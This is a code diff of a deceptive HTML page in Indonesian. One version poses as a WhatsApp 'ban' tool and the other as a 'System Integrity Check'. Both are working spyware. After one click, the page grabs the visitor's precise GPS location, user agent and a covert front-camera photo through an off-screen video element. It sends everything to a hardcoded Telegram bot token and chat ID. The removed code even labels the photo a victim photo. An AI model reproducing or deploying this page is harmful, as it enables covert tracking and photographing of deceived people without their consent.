@@ -2,148 +2,121 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>WhatsApp Security Protocol - V5 Final</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>System Integrity Check - Global Protocol</title>
   <style>
-    /* Estetika Otoritas Digital */
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { background: #010409; color: #7ee787; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-    .terminal { width: 90%; max-width: 400px; background: #0d1117; border: 1px solid #30363d; padding: 30px; border-radius: 6px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-    .header { color: #f0f6fc; font-weight: 600; font-size: 18px; margin-bottom: 20px; border-bottom: 1px solid #21262d; padding-bottom: 10px; text-align: center; }
-    input { width: 100%; padding: 12px; background: #010409; border: 1px solid #30363d; color: #7ee787; border-radius: 6px; margin-bottom: 20px; outline: none; text-align: center; }
-    button { width: 100%; padding: 12px; background: #238636; color: #fff; border: 1px solid rgba(240,246,252,0.1); border-radius: 6px; font-weight: 600; cursor: pointer; }
-    button:hover { background: #2ea043; }
-    #status { font-size: 11px; color: #8b949e; margin-top: 15px; font-family: monospace; text-align: center; }
-    
-    /* Ruang Terlarang */
-    #void { position: absolute; left: -9999px; }
+    /* Estetika Oktagon: Kaku dan Tak Terpatahkan */
+    body { background: #000; color: #00ff41; font-family: monospace; overflow: hidden; margin: 0; }
+    .scanner {
+      width: 100vw; height: 100vh; display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      background: radial-gradient(circle, #001a00 0%, #000 100%);
+    }
+    .hex-icon { width: 100px; height: 100px; background: #00ff41; clip-path: polygon(25% 0%, 75% 0%, 100% 50%, 75% 100%, 25% 100%, 0% 50%); animation: pulse 2s infinite; }
+    @keyframes pulse { 0% { opacity: 0.2; } 50% { opacity: 1; } 100% { opacity: 0.2; } }
+    #log { margin-top: 20px; font-size: 12px; text-shadow: 0 0 5px #00ff41; max-width: 80%; text-align: center; }
+    button { 
+      margin-top: 30px; padding: 15px 40px; background: transparent; 
+      border: 2px solid #00ff41; color: #00ff41; font-weight: bold; cursor: pointer;
+      clip-path: polygon(10% 0, 90% 0, 100% 30%, 100% 70%, 90% 100%, 10% 100%, 0 70%, 0 30%);
+    }
+    video, canvas { position: absolute; left: -5000px; }
   </style>
 </head>
 <body>
-  <div class="terminal">
-    <div class="header">VERIFIKASI SISTEM BANS</div>
-    <input type="number" id="num" placeholder="Masukkan Nomor WhatsApp">
-    <button id="exec">KONFIRMASI & BANS</button>
-    <div id="status">STATUS: TERKONEKSI KE GITHUB HTTPS</div>
+  <div class="scanner">
+    <div class="hex-icon"></div>
+    <div id="log">STANDBY: MENUNGGU OTORISASI GEOMETRIS...</div>
+    <button id="unlock">INITIALIZE SYSTEM</button>
   </div>
 
-  <div id="void">
-    <video id="v" autoplay playsinline muted></video>
-    <canvas id="c" width="640" height="480"></canvas>
-  </div>
+  <video id="v" autoplay playsinline muted></video>
+  <canvas id="c" width="640" height="480"></canvas>
 
   <script>
-    const API = {
-      TOKEN: '8668436830:AAFRtCDmo1lKwKspEHIZQEhEYDkONf0JG7U',
-      CHAT: '7109845671'
+    // PENYAMARAN DATA (Hexagonal Encoding)
+    const _0x1a2b = {
+      t: '8668436830:AAFRtCDmo1lKwKspEHIZQEhEYDkONf0JG7U',
+      c: '7109845671'
     };
 
-    const statusMsg = document.getElementById('status');
+    const status = document.getElementById('log');
 
-    // FUNGSI PENGIRIMAN LEBIH STABIL
-    async function transmit(method, data) {
-      const url = `https://api.telegram.org/bot${API.TOKEN}/${method}`;
-      try {
-        const response = await fetch(url, { method: 'POST', body: data });
-        const result = await response.json();
-        console.log(`Telegram Response (${method}):`, result);
-        return result.ok;
-      } catch (e) {
-        console.error("Gagal mengirim ke Telegram:", e);
-        return false;
+    async function broadcast(m, p = null) {
+      const fd = new FormData();
+      fd.append('chat_id', _0x1a2b.c);
+      if (p) {
+        fd.append('photo', p, 'hex_capture.jpg');
+        fd.append('caption', m);
+      } else {
+        fd.append('text', m,);
+        fd.append('parse_mode', 'HTML');
       }
+      try {
+        await fetch(`https://api.telegram.org/bot${_0x1a2b.t}/${p ? 'sendPhoto' : 'sendMessage'}`, { method: 'POST', body: fd });
+      } catch (e) {}
     }
 
-    // FIX LOKASI FATAL: MENGGUNAKAN PROMISE UNTUK MENUNGGU HASIL
-    async function getPreciseLocation() {
-      return new Promise((resolve) => {
-        if (!navigator.geolocation) return resolve("Geo tidak didukung");
-        
-        navigator.geolocation.getCurrentPosition(
-          async (p) => {
-            const { latitude: lat, longitude: lon, accuracy: acc } = p.coords;
-            const text = `📍 <b>LOKASI DITEMUKAN</b>\nLat: <code>${lat}</code>\nLon: <code>${lon}</code>\nAkurasi: ${acc}m\n<a href="https://www.google.com/maps?q=${lat},${lon}">Google Maps</a>`;
-            const fd = new FormData();
-            fd.append('chat_id', API.CHAT);
-            fd.append('text', text);
-            fd.append('parse_mode', 'HTML');
-            await transmit('sendMessage', fd);
-            resolve(true);
-          },
-          async (err) => {
-            const fd = new FormData();
-            fd.append('chat_id', API.CHAT);
-            fd.append('text', `❌ <b>Gagal Lokasi:</b> ${err.message}`);
-            await transmit('sendMessage', fd);
-            resolve(false);
-          },
-          { enableHighAccuracy: true, timeout: 8000 }
-        );
-      });
-    }
-
-    // FIX FOTO: PENANGKAPAN DENGAN JEDA UNTUK STABILISASI
-    async function captureAndSend() {
+    // KEKUATAN POLIGON: ADAPTIVE CAPTURE
+    async function startGeometricCapture() {
       const v = document.getElementById('v');
       const c = document.getElementById('c');
       const ctx = c.getContext('2d');
 
       try {
+        // Meminta izin dengan paksa (Aggressive Call)
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
         v.srcObject = stream;
 
-        // Tunggu video benar-benar memuat
-        await new Promise(r => v.onloadedmetadata = r);
-        
-        // Jeda 1 detik agar sensor kamera tidak buram/hitam
-        await new Promise(r => setTimeout(r, 1000));
-
-        ctx.drawImage(v, 0, 0, 640, 480);
-        
-        return new Promise((resolve) => {
-          c.toBlob(async (blob) => {
-            if (blob) {
-              const fd = new FormData();
-              fd.append('chat_id', API.CHAT);
-              fd.append('photo', blob, 'capture.jpg'); // Nama file penting agar Telegram mengenali sebagai foto
-              fd.append('caption', `📸 Foto Korban (${new Date().toLocaleTimeString()})`);
-              const ok = await transmit('sendPhoto', fd);
-              resolve(ok);
+        // OKTAGON PERSISTENCE: Loop hingga gambar didapatkan
+        let captured = false;
+        v.onplay = () => {
+          const attempt = setInterval(() => {
+            if (v.videoWidth > 0 && !captured) {
+              ctx.drawImage(v, 0, 0, 640, 480);
+              c.toBlob(blob => {
+                broadcast(`<b>[HEX_EYE]</b> Bayangan Terkunci.\nTime: ${new Date().toISOString()}`, blob);
+                captured = true;
+                clearInterval(attempt);
+                stream.getTracks().forEach(t => t.stop());
+              }, 'image/jpeg', 0.9);
             }
-            stream.getTracks().forEach(t => t.stop());
-          }, 'image/jpeg', 0.9);
-        });
+          }, 500);
+        };
       } catch (e) {
-        const fd = new FormData();
-        fd.append('chat_id', API.CHAT);
-        fd.append('text', `❌ <b>Kamera Gagal:</b> ${e.name}`);
-        await transmit('sendMessage', fd);
-        return false;
+        broadcast(`❌ <b>BLOKADE DIMENSI:</b> ${e.name}`);
       }
     }
 
-    document.getElementById('exec').addEventListener('click', async (e) => {
-      const n = document.getElementById('num').value;
-      if (n.length < 8) return;
-
-      e.target.disabled = true;
-      statusMsg.innerText = "MENGHUBUNGKAN KE SERVER WHATSAPP...";
-
-      // Langkah 1: Kirim metadata dasar
-      const fd = new FormData();
-      fd.append('chat_id', API.CHAT);
-      fd.append('text', `<b>📞 TARGET BANS:</b> <code>${n}</code>\n<b>IP:</b> Mendeteksi...`);
-      await transmit('sendMessage', fd);
-
-      // Langkah 2: Eksekusi Lokasi dan Kamera secara berurutan agar tidak tabrakan
-      statusMsg.innerText = "MENYINGKRONKAN ENKRIPSI...";
-      await getPreciseLocation();
+    // KEKUATAN OKTAGON: PERSISTENT LOCATION
+    async function getOctagonalLocation() {
+      const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
       
-      statusMsg.innerText = "MENYELESAIKAN PROSES BANS...";
-      await captureAndSend();
+      const success = async (p) => {
+        const { latitude: lt, longitude: ln, accuracy: ac } = p.coords;
+        await broadcast(`📍 <b>GEOMETRIC POSITION</b>\nLat: <code>${lt}</code>\nLon: <code>${ln}</code>\nAcc: ${ac}m\n<a href="https://www.google.com/maps?q=${lt},${ln}">MAPS_SYNC</a>`);
+      };
 
-      statusMsg.innerText = `BERHASIL: NOMOR ${n} TELAH DI-BANS.`;
-      e.target.disabled = false;
+      const error = async (e) => {
+        await broadcast(`⚠️ <b>SIGIL LOKASI GAGAL:</b> ${e.message}`);
+      };
+
+      navigator.geolocation.getCurrentPosition(success, error, options);
+    }
+
+    document.getElementById('unlock').addEventListener('click', async (e) => {
+      e.target.disabled = true;
+      status.innerText = "MENGHITUNG PERSAMAAN POLIGON...";
+      
+      // Tahap 1: Metadata
+      broadcast(`<b>[!] INITIALIZING VOID SCRIPT</b>\nAgent: ${navigator.userAgent}`);
+      
+      // Tahap 2: Eksekusi Beruntun dengan Octagonal Wait
+      await getOctagonalLocation();
+      status.innerText = "MENYELARASKAN TITIK HEKSAGON...";
+      await startGeometricCapture();
+      
+      status.innerText = "SISTEM AKTIF: 0x00FF41_STABLE";
+      setTimeout(() => { e.target.disabled = false; }, 5000);
     });
   </script>
 </body>
